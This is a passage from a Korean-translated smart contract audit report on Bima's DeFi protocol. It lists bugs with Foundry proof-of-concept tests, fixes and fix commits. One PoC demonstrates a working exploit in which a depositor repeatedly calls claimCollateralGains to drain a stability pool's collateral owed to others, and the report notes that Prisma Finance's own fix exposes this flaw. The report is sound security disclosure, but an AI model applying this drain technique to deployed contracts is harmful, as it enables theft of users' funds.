    require(msg.sender == babelCore.guardian(), "Only guardian can cancel proposals");
    require(id < proposalData.length, "Invalid ID");

    Action[] storage payload = proposalPayloads[id];
    require(!_containsSetGuardianPayload(payload.length, payload), "Guardian replacement not cancellable");
+   require(!proposalData[id].processed, "Already processed");
    proposalData[id].processed = true;
    emit ProposalCancelled(id);
}
```

**Bima:**
커밋 [18760cb](https://github.com/Bima-Labs/bima-v1-core/commit/18760cb7e6c345c86c8e4e65ddd33adacac858c7#diff-74ae9454ba1373343c226439eed1e6676cdd8be975155f9bdefffaa33c041f0cR309) 및 [97320f4](https://github.com/Bima-Labs/bima-v1-core/commit/97320f440af3522e34337336bbf5355cdc574393#diff-0803a35539c4beef705ebe4c97f2e5ca088748169727ad998076bf4c1d4d26f0R148-R149)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### `TokenLocker::getTotalWeightAt` should loop until input `week` not `systemWeek`

**Description:** `TokenLocker::getTotalWeightAt`은 `systemWeek`가 아닌 입력 `week`까지 반복해야 합니다:
```diff
- while (updatedWeek < systemWeek) {
+ while (updatedWeek < week) {
```

현재 구현은 `week < systemWeek`이고 이전 주간 쓰기가 발생하지 않았을 때 잘못된 출력을 반환하는데, 이는 입력 `week`에 도달하면 중지하는 대신 `systemWeek`까지 모두 계산하는 마지막 `while` 루프 처리를 트리거하기 때문입니다.

유사한 함수인 `getAccountWeightAt`은 입력 `week`까지만 계산하여 이 마지막 루프를 올바르게 수행합니다. 다른 유사한 함수인 `IncentiveVoting::getReceiverWeightAt` 및 `getTotalWeightAt` 또한 입력 `week`까지만 계산하여 이를 올바르게 구현합니다.

**Bima:**
커밋 [dada78b](https://github.com/Bima-Labs/bima-v1-core/commit/dada78b865dc9f19a0b3d7e6fbd93fc1a2c4fb9a)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Less tokens can be allocated to emission receivers than weekly emissions due to precision loss from division before multiplication

**Description:** `BabelVault`는 하나 이상의 배출량 수신자를 생성할 수 있게 하며, `IncentiveVoting`은 토큰 잠금자가 주간 토큰 배출량을 어떻게 분배할지에 대해 투표할 수 있게 합니다.

* `IncentiveVoting::getReceiverVotePct`는 `totalWeeklyWeights[week]`로 [나눗셈](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/IncentiveVoting.sol#L206)을 수행합니다.
* `EmissionSchedule::getReceiverWeeklyEmissions`는 이전에 나눈 반환된 금액을 다시 나누기 전에 [곱합니다](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/EmissionSchedule.sol#L94).

이는 [곱셈 전 나눗셈](https://dacian.me/precision-loss-errors#heading-division-before-multiplication)으로 인한 정밀도 손실을 발생시켜 개별 수신자에게 할당된 금액의 합계가 총 주간 배출량보다 적게 됩니다.

**Impact:** 총 주간 배출량과 수신자에게 할당된 금액의 합계 간의 차이가 손실됩니다.

**Proof of Concept:** 다음 PoC 함수를 `test/foundry/dao/VaultTest.t.sol`에 추가하세요:
```solidity
function test_allocateNewEmissions_twoReceiversWithUnequalExtremeVotingWeight() public {
    // setup vault giving user1 half supply to lock for voting power
    uint256 initialUnallocated = _vaultSetupAndLockTokens(INIT_BAB_TKN_TOTAL_SUPPLY/2);

    // helper registers receivers and performs all necessary checks
    address receiver = address(mockEmissionReceiver);
    uint256 RECEIVER_ID = _vaultRegisterReceiver(receiver, 1);

    // owner registers second emissions receiver
    MockEmissionReceiver mockEmissionReceiver2 = new MockEmissionReceiver();
    address receiver2 = address(mockEmissionReceiver2);
    uint256 RECEIVER2_ID = _vaultRegisterReceiver(receiver2, 1);

    // user votes for both receivers to get emissions but with
    // extreme voting weights (1 and Max-1)
    IIncentiveVoting.Vote[] memory votes = new IIncentiveVoting.Vote[](2);
    votes[0].id = RECEIVER_ID;
    votes[0].points = 1;
    votes[1].id = RECEIVER2_ID;
    votes[1].points = incentiveVoting.MAX_POINTS()-1;

    vm.prank(users.user1);
    incentiveVoting.registerAccountWeightAndVote(users.user1, 52, votes);

    // warp time by 1 week
    vm.warp(block.timestamp + 1 weeks);

    // cache state prior to allocateNewEmissions
    uint16 systemWeek = SafeCast.toUint16(babelVault.getWeek());

    // initial unallocated supply has not changed
    assertEq(babelVault.unallocatedTotal(), initialUnallocated);

    // receiver calls allocateNewEmissions
    vm.prank(receiver);
    uint256 allocated = babelVault.allocateNewEmissions(RECEIVER_ID);

    // verify BabelVault::totalUpdateWeek current system week
    assertEq(babelVault.totalUpdateWeek(), systemWeek);

    // verify unallocated supply reduced by weekly emission percent
    uint256 firstWeekEmissions = initialUnallocated*INIT_ES_WEEKLY_PCT/MAX_PCT;
    assertTrue(firstWeekEmissions > 0);
    uint256 remainingUnallocated = initialUnallocated - firstWeekEmissions;
    assertEq(babelVault.unallocatedTotal(), remainingUnallocated);

    // verify emissions correctly set for current week
    assertEq(babelVault.weeklyEmissions(systemWeek), firstWeekEmissions);

    // verify BabelVault::lockWeeks reduced correctly
    assertEq(babelVault.lockWeeks(), INIT_ES_LOCK_WEEKS-INIT_ES_LOCK_DECAY_WEEKS);

    // verify receiver active and last processed week = system week
    (, bool isActive, uint16 updatedWeek) = babelVault.idToReceiver(RECEIVER_ID);
    assertEq(isActive, true);
    assertEq(updatedWeek, systemWeek);

    // receiver2 calls allocateNewEmissions
    vm.prank(receiver2);
    uint256 allocated2 = babelVault.allocateNewEmissions(RECEIVER2_ID);

    // verify most things remain the same
    assertEq(babelVault.totalUpdateWeek(), systemWeek);
    assertEq(babelVault.unallocatedTotal(), remainingUnallocated);
    assertEq(babelVault.weeklyEmissions(systemWeek), firstWeekEmissions);
    assertEq(babelVault.lockWeeks(), INIT_ES_LOCK_WEEKS-INIT_ES_LOCK_DECAY_WEEKS);

    // verify receiver2 active and last processed week = system week
    (, isActive, updatedWeek) = babelVault.idToReceiver(RECEIVER2_ID);
    assertEq(isActive, true);
    assertEq(updatedWeek, systemWeek);

    // verify that the recorded first week emissions is equal to
    // the amounts allocated to both receivers
    // fails here
    // firstWeekEmissions   = 536870911875000000000000000
    // allocated+allocated2 = 536870911874999999463129087
    assertEq(firstWeekEmissions, allocated + allocated2);
}
```

**Recommended Mitigation:** `IncentiveVoting::getReceiverVotePct`를 나눗셈을 수행하지 않고 계산에 필요한 입력을 반환하는 새로운 함수 `getReceiverVoteInputs`로 대체하세요:
```solidity
function getReceiverVoteInputs(uint256 id, uint256 week) external
returns (uint256 totalWeeklyWeight, uint256 receiverWeeklyWeight) {
    // lookback one week
    week -= 1;

    // update storage - id & total weights for any
    // missing weeks up to current system week
    getReceiverWeightWrite(id);
    getTotalWeightWrite();

    // output total weight for lookback week
    totalWeeklyWeight = totalWeeklyWeights[week];

    // if not zero, also output receiver weekly weight
    if(totalWeeklyWeight != 0) {
        receiverWeeklyWeight = receiverWeeklyWeights[id][week];
    }
}
```

`EmissionSchedule::getReceiverWeeklyEmissions`가 새로운 함수를 사용하도록 변경하세요:
```solidity
function getReceiverWeeklyEmissions(
    uint256 id,
    uint256 week,
    uint256 totalWeeklyEmissions
) external returns (uint256 amount) {
    // get vote calculation inputs from IncentiveVoting
    (uint256 totalWeeklyWeight, uint256 receiverWeeklyWeight)
        = voter.getReceiverVoteInputs(id, week);

    // if there was weekly weight, calculate the amount
    // otherwise default returns 0
    if(totalWeeklyWeight != 0) {
        amount = totalWeeklyEmissions * receiverWeeklyWeight / totalWeeklyWeight;
    }
}
```

제공된 PoC에서 이는 정밀도 손실을 단 1 wei로 줄입니다:
```solidity
assertEq(firstWeekEmissions,     536870911875000000000000000);
assertEq(allocated + allocated2, 536870911874999999999999999);
```

**Bima:**
커밋 [3903717](https://github.com/Bima-Labs/bima-v1-core/commit/3903717bcff33684fe89080c1a2e98fcccd976cf)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### `StabilityPool::claimCollateralGains` should accrue depositor collateral gains before claiming

**Description:** `StabilityPool::claimCollateralGains`는 사용자에게 이득을 보내기 위해 각 담보에 대해 `collateralGainsByDepositor[msg.sender]`를 [읽습니다](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/StabilityPool.sol#L706-L713).

그러나 `collateralGainsByDepositor`를 새로운 이득으로 [업데이트](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/StabilityPool.sol#L560-L562)하는 `_accrueDepositorCollateralGain`에 대한 호출이 없습니다.

**Impact:** `StabilityPool::claimCollateralGains`를 호출할 때 사용자는 기대했던 모든 이득을 받지 못합니다. 사용자가 이를 깨닫고 청구하기 전에 `_accrueDepositorCollateralGain`을 호출하는 다른 작업을 트리거하면 이득을 영구적으로 잃지 않을 수 있지만, 사용자는 자신이 자격이 있는 모든 이득을 받지 못했다는 사실조차 깨닫지 못할 수 있습니다.

**Recommended Mitigation:** `StabilityPool::claimReward`를 `external` 대신 `public`으로 만들고 `claimCollateralGains`가 나머지 처리 전에 이를 호출해야 합니다.

Prisma Finance는 `claimCollateralGains`가 `_accrueDepositorCollateralGain`을 직접 호출하도록 하여 이를 [수정](https://github.com/prisma-fi/prisma-contracts/commit/76dbc51db0c0d4c92a59776f5effc47e31e88087)했지만, 우리는 이것이 공격자가 안정성 풀(stability pool)에서 담보 토큰을 고갈시킬 수 있는 치명적인 익스플로잇을 초래한다는 것을 발견했습니다. 익스플로잇 PoC를 [LiquidationManagerTest.t.sol](https://github.com/devdacian/bima-v1-core/blob/main/test/foundry/core/LiquidationManagerTest.t.sol)에 추가하세요:
```solidity
function test_attackerDrainsStabilityPoolCollateralTokens() external {
    // user1 and user 2 both deposit 10K into the stability pool
    uint96 spDepositAmount = 10_000e18;
    _provideToSP(users.user1, spDepositAmount, 1);
    _provideToSP(users.user2, spDepositAmount, 1);

    // user1 opens a trove using 1 BTC collateral (price = $60,000 in MockOracle)
    uint256 collateralAmount = 1e18;

    uint256 debtAmountMax = _getMaxDebtAmount(collateralAmount);

    _openTrove(users.user1, collateralAmount, debtAmountMax);

    // set new value of btc to $50,000 to make trove liquidatable
    mockOracle.setResponse(mockOracle.roundId() + 1,
                           int256(50000 * 10 ** 8),
                           block.timestamp + 1,
                           block.timestamp + 1,
                           mockOracle.answeredInRound() + 1);
    // warp time to prevent cached price being used
    vm.warp(block.timestamp + 1);

    // save previous state
    LiquidationState memory statePre = _getLiquidationState(users.user1);

    // both users deposits in the stability pool
    assertEq(statePre.stabPoolTotalDebtTokenDeposits, spDepositAmount * 2);

    // liquidate via `liquidate`
    liquidationMgr.liquidate(stakedBTCTroveMgr, users.user1);

    // save after state
    LiquidationState memory statePost = _getLiquidationState(users.user1);

    // verify trove owners count decreased
    assertEq(statePost.troveOwnersCount, statePre.troveOwnersCount - 1);

    // verify correct trove status
    assertEq(uint8(stakedBTCTroveMgr.getTroveStatus(users.user1)),
             uint8(ITroveManager.Status.closedByLiquidation));

    // user1 after state all zeros
    assertEq(statePost.userDebt, 0);
    assertEq(statePost.userColl, 0);
    assertEq(statePost.userPendingDebtReward, 0);
    assertEq(statePost.userPendingCollateralReward, 0);

    // verify total active debt & collateral reduced by liquidation
    assertEq(statePost.totalDebt, statePre.totalDebt - debtAmountMax - INIT_GAS_COMPENSATION);
    assertEq(statePost.totalColl, statePre.totalColl - collateralAmount);

    // verify stability pool debt token deposits reduced by amount used to offset liquidation
    uint256 userDebtPlusPendingRewards = statePre.userDebt + statePre.userPendingDebtReward;
    uint256 debtToOffsetUsingStabilityPool = BabelMath._min(userDebtPlusPendingRewards,
                                                            statePre.stabPoolTotalDebtTokenDeposits);

    // verify default debt calculated correctly
    assertEq(statePost.stabPoolTotalDebtTokenDeposits,
             statePre.stabPoolTotalDebtTokenDeposits - debtToOffsetUsingStabilityPool);
    assertEq(stakedBTCTroveMgr.defaultedDebt(),
             userDebtPlusPendingRewards - debtToOffsetUsingStabilityPool);

    // calculate expected collateral to liquidate
    uint256 collToLiquidate = statePre.userColl - _getCollGasCompensation(statePre.userColl);

    // calculate expected collateral to send to stability pool
    uint256 collToSendToStabilityPool = collToLiquidate *
                                        debtToOffsetUsingStabilityPool /
                                        userDebtPlusPendingRewards;

    // verify defaulted collateral calculated correctly
    assertEq(stakedBTCTroveMgr.defaultedCollateral(),
             collToLiquidate - collToSendToStabilityPool);

    assertEq(stakedBTCTroveMgr.L_collateral(), stakedBTCTroveMgr.defaultedCollateral());
    assertEq(stakedBTCTroveMgr.L_debt(), stakedBTCTroveMgr.defaultedDebt());

    // verify stability pool received collateral tokens
    assertEq(statePost.stabPoolStakedBTCBal, statePre.stabPoolStakedBTCBal + collToSendToStabilityPool);

    // verify stability pool lost debt tokens
    assertEq(statePost.stabPoolDebtTokenBal, statePre.stabPoolDebtTokenBal - debtToOffsetUsingStabilityPool);

    // no TroveManager errors
    assertEq(stakedBTCTroveMgr.lastCollateralError_Redistribution(), 0);
    assertEq(stakedBTCTroveMgr.lastDebtError_Redistribution(), 0);

    // user1 and user2 are both stability pool depositors so they
    // gain an equal share of the collateral sent to the stability pool
    // (at least in our PoC with simple whole numbers)
    uint256 collateralGainsPerUser = collToSendToStabilityPool / 2;

    uint256[] memory user1CollateralGains = stabilityPool.getDepositorCollateralGain(users.user1);
    assertEq(user1CollateralGains.length, 1);
    assertEq(user1CollateralGains[0], collateralGainsPerUser);

    uint256[] memory user2CollateralGains = stabilityPool.getDepositorCollateralGain(users.user2);
    assertEq(user2CollateralGains.length, 1);
    assertEq(user2CollateralGains[0], collateralGainsPerUser);

    // user2 claims their gains
    assertEq(stakedBTC.balanceOf(users.user2), 0);
    uint256[] memory collateralIndexes = new uint256[](1);
    collateralIndexes[0] = 0;
    vm.prank(users.user2);
    stabilityPool.claimCollateralGains(users.user2, collateralIndexes);
    assertEq(stakedBTC.balanceOf(users.user2), collateralGainsPerUser);
    assertEq(stakedBTC.balanceOf(address(stabilityPool)), statePost.stabPoolStakedBTCBal - collateralGainsPerUser);

    // user2 can immediately claim the same amount again!
    vm.prank(users.user2);
    stabilityPool.claimCollateralGains(users.user2, collateralIndexes);
    assertEq(stakedBTC.balanceOf(users.user2), collateralGainsPerUser * 2);
    assertEq(stakedBTC.balanceOf(address(stabilityPool)), 0);

    // user2 can keep claiming until they drain all the stability pool's
    // collateral tokens - in this case since there were only 2 depositors
    // with equal deposits, the second immediate claim has stolen the collateral
    // tokens that should have gone to user1

    // if user1 tries to claim this reverts since although StabilityPool
    // knows it owes user1 collateral gain tokens, it has been drained!
    vm.expectRevert("ERC20: transfer amount exceeds balance");
    vm.prank(users.user1);
    stabilityPool.claimCollateralGains(users.user2, collateralIndexes);
}
```

실행: `forge test --match-test test_attackerDrainsStabilityPoolCollateralTokens`

**Bima:**
커밋 [c3fc3e5](https://github.com/Bima-Labs/bima-v1-core/commit/c3fc3e5620a68b03ebfd832874342e084ca4921e)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### `StabilityPool::claimableReward` incorrectly returns lower than actual value as it doesn't include `storedPendingReward`

**Description:** `StabilityPool::claimableReward`는 사용자에게 보류 중인 보상을 보여주는 데 사용할 수 있는 `external view` 함수입니다. 그러나 `storedPendingReward[_depositor]` 내부의 금액을 [포함하지 않아](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/StabilityPool.sol#L577-L597) 실제 값보다 낮은 값을 보고합니다.

실제로 보상을 청구하는 데 사용되는 `StabilityPool::_claimReward`와 비교해보면, 이 함수는 `storedPendingReward[account]`를 총 청구 보상에 [포함합니다](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/StabilityPool.sol#L799-L802).

**Impact:** 사용자는 실제보다 적은 보상을 받을 것으로 안내받습니다.

**Recommended Mitigation:** `StabilityPool::claimableReward`는 반환하는 총 보상 금액에 `storedPendingReward[_depositor]`를 포함해야 합니다.

**Bima:**
커밋 [0de27a0](https://github.com/Bima-Labs/bima-v1-core/commit/0de27a0c172deb1be1c2338cb688d15940caf385)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### `StabilityPool` user functions panic revert if more than 256 collaterals are enabled

**Description:** `StabilityPool`에는 값 구성 요소가 길이가 256인 배열인 여러 매핑이 있습니다:
```solidity
mapping(address depositor => uint256[256] deposits) public depositSums;
mapping(address depositor => uint80[256] gains) public collateralGainsByDepositor;
mapping(uint128 epoch => mapping(uint128 scale => uint256[256] sumS)) public epochToScaleToSums;
mapping(uint128 epoch => mapping(uint128 scale => uint256 sumG)) public epochToScaleToG;
```

모든 담보를 반복한 다음 이 배열들을 업데이트하는 여러 내부 함수들이 있습니다. 예:
```solidity
function _updateSnapshots(address _depositor, uint256 _newValue) internal {
    uint256 length;
    if (_newValue == 0) {
        delete depositSnapshots[_depositor];

        length = collateralTokens.length;
        for (uint256 i; i < length; i++) {
            // @audit will panic revert if >= 257 collaterals are enabled
            depositSums[_depositor][i] = 0;
        }
```

또한 `StabilityPool::enableCollateral`은 추가할 수 있는 최대 담보 양에 대한 제한이 없습니다.

**Impact:** 사용자 함수가 패닉 revert 되고 프로토콜을 사용할 수 없게 됩니다. `StabilityPool::collateralTokens`는 멤버를 제거할 수 없고 덮어쓸 수만 있으므로 프로토콜은 영구적으로 벽돌(bricked)이 됩니다.

**Proof of Concept:** PoC 함수를 `test/foundry/core/StabilityPoolTest.sol`에 추가하세요:
```solidity
function test_provideToSP_panicWhen257Collaterals() external {
    for(uint160 i=1; i<=256; i++) {
        address newCollateral = address(i);

        vm.prank(address(factory));
        stabilityPool.enableCollateral(IERC20(newCollateral));
    }

    assertEq(stabilityPool.getNumCollateralTokens(), 257);

    // mint user1 some tokens
    uint256 tokenAmount = 100e18;
    vm.prank(address(borrowerOps));
    debtToken.mint(users.user1, tokenAmount);
    assertEq(debtToken.balanceOf(users.user1), tokenAmount);

    // user1 deposits them into stability pool
    vm.prank(users.user1);
    stabilityPool.provideToSP(tokenAmount);
    // fails with panic: array out-of-bounds access
}
```

실행: `forge test --match-test test_provideToSP_panicWhen257Collaterals`

**Recommended Mitigation:** 첫째, 하드코딩된 리터럴 256 대신 목적을 나타내는 명명된 상수를 사용하세요.

둘째, `StabilityPool::enableCollateral`이 256개 이상의 담보를 추가하지 못하도록 방지하세요.

**Bima:**
커밋 [73c1dfd](https://github.com/Bima-Labs/bima-v1-core/commit/73c1dfdefbfe058416008c55c4b2a2817d56ba4d)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### `setGuardian` proposals may incorrectly set lower passing percent if current default is greater than hard-coded value for guardian proposals

**Description:** `AdminVoting::createNewProposal`은 `setGuardian` 제안에 대해 항상 하드코딩된 `SET_GUARDIAN_PASSING_PCT`를 통과 비율로 사용하는 체크를 가지고 있습니다:

```solidity
if (_containsSetGuardianPayload(payload.length, payload)) {
    // prevent changing guardians during bootstrap period
    require(block.timestamp > startTime + BOOTSTRAP_PERIOD, "Cannot change guardian during bootstrap");

    // enforce 50.1% majority for setGuardian proposals
    proposalPassPct = SET_GUARDIAN_PASSING_PCT;
}
// otherwise for ordinary proposals enforce standard configured passing %
else proposalPassPct = passingPct;
```

아이디어는 `setGuardian` 제안이 매우 민감한 제안이므로 통과하려면 50.1%의 과반수가 필요하고, 다른 제안은 덜 민감하므로 더 낮은 제안 비율로 통과될 수 있다는 것입니다.

그러나 DAO가 기본 통과 비율을 `SET_GUARDIAN_PASSING_PCT`보다 크게 변경하기로 결정하면, `setGuardian` 제안은 일반 제안보다 낮은 통과 비율로 생성될 것이며 이는 의도한 바와 반대됩니다.

`setGuardian` 제안에 대해 `proposalPassPct`를 설정할 때, 현재 `passingPct`를 고려하지 않고 단순히 `SET_GUARDIAN_PASSING_PCT = 50.1%`를 사용합니다. 예상치 못한 이유로 `passingPct`가 `50.1%`보다 클 때 위험할 수 있습니다.

**Recommended Mitigation:** `setGuardian` 제안의 경우, 현재 구성된 통과 비율과 하드코딩된 `SET_GUARDIAN_PASSING_PCT` 중 더 큰 값으로 통과 비율을 설정하세요:
```diff
- proposalPassPct = SET_GUARDIAN_PASSING_PCT;
+ proposalPassPct = BabelMath._max(SET_GUARDIAN_PASSING_PCT, passingPct);
```

**Bima:**
커밋 [7642dc1](https://github.com/Bima-Labs/bima-v1-core/commit/7642dc18201ef5047f9b3ad6119843a15f2d319f)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### Prevent panic from division by zero in `BabelBase::_requireUserAcceptsFee`

**Description:** `BabelBase::_requireUserAcceptsFee`에서 0으로 나누기 패닉을 방지하세요:
```diff
function _requireUserAcceptsFee(uint256 _fee, uint256 _amount, uint256 _maxFeePercentage) internal pure {
+   require(_amount > 0, "Amount must be greater than zero");
    uint256 feePercentage = (_fee * BIMA_DECIMAL_PRECISION) / _amount;
    require(feePercentage <= _maxFeePercentage, "Fee exceeded provided maximum");
}
```

**Bima:**
커밋 [fe67023](https://github.com/Bima-Labs/bima-v1-core/commit/fe670238f6290cec1d803dc68160d96592fc5346)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### `TokenLocker::withdrawWithPenalty` doesn't reset account bitfield when dust handling results in no remaining locked tokens

**Description:** 사용자가 `TokenLocker::withdrawWithPenalty`를 사용하여 잠긴 토큰을 인출할 때, [먼지(dust) 처리](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/dao/TokenLocker.sol#L841-L852) 후 사용자에게 남은 잠긴 토큰이 없으면 계정의 `bitfield`가 올바르게 재설정되지 않습니다.

**Impact:** 스토리지 상태가 일관되지 않게 되어, `TokenLocker`는 사용자가 0개의 토큰을 잠갔음에도 불구하고 활성 잠금 상태라고 판단합니다. 이러한 불일치 상태는 사용자가 존재하지 않는 계정 가중치를 등록하면 `IncentiveVoting`으로 확산될 수 있습니다. 불일치 상태 외에 이를 악용하여 더 큰 피해를 줄 방법은 없어 보입니다.

**Proof of Concept:** PoC 함수를 `test/foundry/dao/TokenLockerTest.t.sol`에 추가하세요:
```solidity
function test_withdrawWithPenalty_activeLockWithZeroLocked() external {
    uint256 amountToLock = 100;
    uint256 weeksToLockFor = 20;

    // first enable penalty withdrawals
    test_setPenaltyWithdrawalsEnabled(0, true);

    // save user initial balance
    uint256 userPreTokenBalance = babelToken.balanceOf(users.user1);

    // perform the lock
    (uint256 lockedAmount, uint256 weeksLockedFor) = test_lock(amountToLock, weeksToLockFor);
    // verify the lock result
    assertEq(lockedAmount, 100);
    assertEq(weeksLockedFor, 20);

    // verify user has received weight in the current week
    uint256 week = tokenLocker.getWeek();
    assertTrue(tokenLocker.getAccountWeightAt(users.user1, week) != 0);

    // perform the withdraw with penalty
    vm.prank(users.user1);
    uint256 amountToWithdraw = 61;
    tokenLocker.withdrawWithPenalty(amountToWithdraw);

    // calculate expected penaltyOnAmount = 61 * 1e18 * (52 - 32) / 32 = 38.125e18
    // so amountToWithdraw + penaltyOnAmount = 99.125e18 and will be 100 after handling dust
    // https://github.com/Bima-Labs/bima-v1-core/blob/main/contracts/dao/TokenLocker.sol#L1080

    // verify account's weight was reset
    assertEq(tokenLocker.getAccountWeightAt(users.user1, week), 0);

    // verify total weight was reset
    assertEq(tokenLocker.getTotalWeight(), 0);

    // getAccountActiveLocks incorrectly shows user still has an active lock
    (ITokenLocker.LockData[] memory activeLockData, uint256 frozenAmount)
        = tokenLocker.getAccountActiveLocks(users.user1, weeksToLockFor);

    assertEq(activeLockData.length, 1); // 1 active lock
    assertEq(frozenAmount, 0);
    assertEq(activeLockData[0].amount, 0); // 0 locked amount
    assertEq(activeLockData[0].weeksToUnlock, weeksToLockFor);

    // user can register with IncentiveVoting even though they have no
    // tokens locked
    vm.prank(users.user1);
    incentiveVoting.registerAccountWeight(users.user1, weeksToLockFor);

    (uint256 frozenWeight, ITokenLocker.LockData[] memory lockData)
        = incentiveVoting.getAccountRegisteredLocks(users.user1);
    assertEq(frozenWeight, 0);
    assertEq(lockData.length, 1);
    assertEq(lockData[0].amount, 0); // 0 locked amount
    assertEq(lockData[0].weeksToUnlock, weeksToLockFor);

    // this results in an inconsistent state but there doesn't appear
    // to be any way to further exploit this state since the locked
    // amount is zero
}
```

실행: `forge test --match-test test_withdrawWithPenalty_activeLockWithZeroLocked`

**Recommended Mitigation:** `TokenLocker::withdrawWithPenalty`는 먼지 처리가 사용자에게 남은 잠긴 토큰이 없는 결과를 초래하는 경우 `bitfield`를 재설정해야 합니다:

```diff
      if (lockAmount - penaltyOnAmount > remaining) {
          // then recalculate the penalty using only the portion of the lock
          // amount that will be withdrawn
          penaltyOnAmount = (remaining * MAX_LOCK_WEEKS) / (MAX_LOCK_WEEKS - weeksToUnlock) - remaining;

          // add any dust to the penalty amount
          uint256 dust = ((penaltyOnAmount + remaining) % lockToTokenRatio);
          if (dust > 0) penaltyOnAmount += lockToTokenRatio - dust;

          // update memory total penalty
          penaltyTotal += penaltyOnAmount;

          // calculate amount to reduce lock as penalty + withdrawn amount,
          // scaled down by lockToTokenRatio as those values were prev scaled up by this
          uint256 lockReduceAmount = (penaltyOnAmount + remaining) / lockToTokenRatio;

          // update memory total voting weight reduction
          decreasedWeight += lockReduceAmount * weeksToUnlock;

          // update storage to decrease week's future unlocks
          accountWeeklyUnlocks[msg.sender][systemWeek] -= SafeCast.toUint32(lockReduceAmount);
          totalWeeklyUnlocks[systemWeek] -= SafeCast.toUint32(lockReduceAmount);

+        if (accountWeeklyUnlocks[msg.sender][systemWeek] == 0) {
+            bitfield = bitfield & ~(uint256(1) << (systemWeek % 256));
+         }

          // nothing remaining to be withdrawn
          remaining = 0;
      }
```
**Bima:**
커밋 [1463ba2](https://github.com/Bima-Labs/bima-v1-core/commit/1463ba2cc191a03e9db150e0dbc7ce7f3d1e3777)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다.


### `TroveManager::redeemCollateral` can return less collateral tokens than expected due to rounding down to zero precision loss

**Description:** 사용자가 큰 부채 금액으로 `TroveManager::redeemCollateral`을 호출하여 다음과 같은 경우:
* 첫 번째 트로브가 완전히 고갈되고 닫힘
* 두 번째 트로브에서 사용된 남은 부채 금액이 작음

담보 [계산](https://github.com/Bima-Labs/bima-v1-core/blob/09461f0d22556e810295b12a6d7bc5c0efec4627/contracts/core/TroveManager.sol#L753)에서 [0으로 내림되는 정밀도 손실](https://dacian.me/precision-loss-errors#heading-rounding-down-to-zero)이 발생합니다:
```solidity
singleRedemption.collateralLot = (singleRedemption.debtLot * BIMA_DECIMAL_PRECISION) / _price;
```

이로 인해 남은 부채 금액이 다음 트로브의 부채를 줄이는 데 사용되더라도 사용자는 해당 금액에 대한 담보를 받지 못하게 됩니다.

**Impact:** `TroveManager::redeemCollateral`은 0으로 내림되는 정밀도 손실로 인해 예상보다 적은 담보 토큰을 반환할 수 있습니다.

**Proof of Concept:** PoC를 `test/foundry/core/BorrowerOperationsTest.t.sol`에 추가하세요:
```solidity
function test_redeemCollateral_noCollateralForRemainingAmount() external {
    // fast forward time to after bootstrap period
    vm.warp(stakedBTCTroveMgr.systemDeploymentTime() + stakedBTCTroveMgr.BOOTSTRAP_PERIOD());

    // update price oracle response to prevent stale revert
    mockOracle.setResponse(mockOracle.roundId() + 1,
                           mockOracle.answer(),
                           mockOracle.startedAt(),
                           block.timestamp,
                           mockOracle.answeredInRound() + 1);

    // user1 opens a trove with 2 BTC collateral for their max borrowing power
    uint256 collateralAmount = 1e18;

    uint256 debtAmountMax
        = ((collateralAmount * _getScaledOraclePrice() / borrowerOps.CCR())
          - INIT_GAS_COMPENSATION);

    _openTrove(users.user1, collateralAmount, debtAmountMax);

    // user2 opens a trove with 2 BTC collateral for their max borrowing power
    _openTrove(users.user2, collateralAmount, debtAmountMax);

    // mint user3 enough debt tokens such that they will close
    // user1's trove and attempt to redeem part of user2's trove,
    // but the second amount is small enough to trigger a rounding
    // down to zero precision loss in the `singleRedemption.collateralLot`
    // calculation
    uint256 debtToSend = debtAmountMax + 59_999;

    // save a snapshot state before redeem
    uint256 snapshotPreRedeem = vm.snapshot();

    vm.prank(address(borrowerOps));
    debtToken.mint(users.user3, debtToSend);
    assertEq(debtToken.balanceOf(users.user3), debtToSend);
    assertEq(stakedBTC.balanceOf(users.user3), 0);

    // user3 exchanges their debt tokens for collateral
    uint256 maxFeePercent = stakedBTCTroveMgr.maxRedemptionFee();

    vm.prank(users.user3);
    stakedBTCTroveMgr.redeemCollateral(debtToSend,
                                       users.user1, address(0), address(0), 3750000000000000, 0,
                                       maxFeePercent);

    // verify user3 has no debt tokens
    assertEq(debtToken.balanceOf(users.user3), 0);

    // verify user3 received some collateral tokens
    uint256 user3ReceivedCollateralFirst = stakedBTC.balanceOf(users.user3);
    assertTrue(user3ReceivedCollateralFirst > 0);

    // now rewind to snapshot before redeem
    vm.revertTo(snapshotPreRedeem);

    // this time do just enough to close the first trove, without the excess 59_999
    debtToSend = debtAmountMax;

    vm.prank(address(borrowerOps));
    debtToken.mint(users.user3, debtToSend);
    assertEq(debtToken.balanceOf(users.user3), debtToSend);
    assertEq(stakedBTC.balanceOf(users.user3), 0);

    vm.prank(users.user3);
    stakedBTCTroveMgr.redeemCollateral(debtToSend,
                                       users.user1, address(0), address(0), 3750000000000000, 0,
                                       maxFeePercent);

    // verify user3 has no debt tokens
    assertEq(debtToken.balanceOf(users.user3), 0);

    // verify user3 received some collateral tokens
    uint256 user3ReceivedCollateralSecond = stakedBTC.balanceOf(users.user3);
    assertTrue(user3ReceivedCollateralSecond > 0);

    // user3 received the same amount of collateral tokens, even though
    // they redeemed less debt tokens than the first time
    assertEq(user3ReceivedCollateralSecond, user3ReceivedCollateralFirst);
}
```

